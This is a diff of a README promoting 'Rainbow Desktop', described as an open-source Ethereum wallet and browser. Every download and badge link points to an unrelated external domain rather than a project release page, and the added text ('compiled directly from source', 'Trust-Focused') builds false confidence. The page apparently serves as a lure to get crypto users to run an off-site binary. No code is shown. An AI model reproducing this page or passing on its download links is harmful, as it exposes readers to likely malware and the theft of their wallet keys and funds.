@@ -1,22 +1,9 @@
-<h1 align="center">Rainbow Desktop — Open Source Web3 Wallet & Browser</h1>
+# Rainbow Desktop — Open Source Web3 Wallet & Browser
 
-<p align="center">
-  <strong>The Lightweight, Privacy-First Desktop Client for Ethereum, NFTs, and DeFi</strong>
-</p>
+The Lightweight, Privacy-First Desktop Client for Ethereum, NFTs, and DeFi.  
+**Secure. Fast. Transparent.**
 
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge&logo=github" alt="Download Release"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
-  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-MIT-orange?style=for-the-badge" alt="License"></a>
-</p>
-
-<p align="center">
-  <a href="https://yeelen.cg/gh/"><strong>📥 Download Application</strong></a> •
-  <a href="#-key-features">Key Features</a> •
-  <a href="#-system-requirements">Requirements</a> •
-  <a href="#-installation--deployment">Installation</a> •
-  <a href="#-frequently-asked-questions">FAQ</a>
-</p>
+[📥 Download Application](https://yeelen.cg/gh/) • [Key Features](#-key--features) • [Requirements](#-system-requirements) • [Installation](#-installation--deployment) • [FAQ](#-frequently-asked-questions)
 
 ---
 
@@ -25,6 +12,9 @@
 **Rainbow Desktop** is a sleek, open-source desktop wallet built for the decentralized web. It combines the speed of a native browser with the security of a self-custody wallet. Unlike heavy clients, Rainbow Desktop is designed to be lightweight and fast, allowing users to interact with DApps (Uniswap, OpenSea, Aave) directly from their desktop environment without leaving the app.
 
 Perfect for crypto enthusiasts who want to manage ETH, ERC-20 tokens, NFTs, and DeFi positions with full control over their private keys, all while enjoying a beautiful, intuitive interface.
+
+> 💡 **Why this version?**  
+> This build is compiled directly from source code. It ensures transparency, security, and access to the latest features before they reach mass-market stores.
 
 ---
 
@@ -49,10 +39,10 @@ Get the latest build or source files directly using the links below:
 *   **Multi-Chain Support:** Built-in support for Ethereum, Polygon, Arbitrum, Optimism, and Base networks. Switch chains instantly with one click.
 *   **NFT Gallery:** A beautiful, optimized gallery to view, manage, and send your NFTs directly from the desktop client.
 
-### 🛡️ Security & Privacy
+### 🛡️ Security & Privacy (Trust-Focused)
 *   **Local Key Storage:** Your private keys are stored locally on your device (encrypted), ensuring maximum security and uptime even if network providers go down.
-*   **Hardware Wallet Ready:** Full compatibility with Ledger and Trezor for high-security transactions.
 *   **No Telemetry:** Truly open-source codebase. No tracking, no ads, and no data monetization by default.
+*   **Hardware Wallet Ready:** Full compatibility with Ledger and Trezor for high-security transactions.
 
 ### ⚡ Performance & Usability
 *   **Lightweight Electron Build:** Optimized for low RAM usage compared to other desktop wallets. Launches in seconds.
